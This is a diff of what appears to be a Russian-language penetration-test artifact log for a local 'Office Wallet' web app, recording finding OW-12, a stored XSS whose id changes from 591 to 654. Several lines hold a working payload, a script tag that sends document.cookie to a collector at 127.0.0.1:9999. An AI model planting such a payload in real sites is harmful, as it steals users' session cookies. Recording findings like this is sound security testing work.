@@ -64,12 +64,12 @@ OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
     ← HTTP 302 redirect=http://localhost:18081/history  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
     → GET /tips/received  (ищем id своего чаевого)
     ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Входящие чаевые · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapi...
-    → GET /tips/received?id=591  (карточка, Template.HTML без экранирования)
-    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Чаевые #591 · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
-    → SQL SELECT memo FROM operations WHERE id=591
+    → GET /tips/received?id=654  (карточка, Template.HTML без экранирования)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Чаевые #654 · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → SQL SELECT memo FROM operations WHERE id=654
     ← psql <ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
     ┌─ АРТЕФАКТ · OW-12 · сохранённый XSS лежит в БД и возвращается карточкой
-    │ operations.id=591 memo=<ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
-    │ GET /tips/received?id=591 → HTTP 200; payload не экранирован
+    │ operations.id=654 memo=<ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+    │ GET /tips/received?id=654 → HTTP 200; payload не экранирован
     └─
-[+] сохранённый payload лежит в карточке без экранирования: /tips/received?id=591
+[+] сохранённый payload лежит в карточке без экранирования: /tips/received?id=654
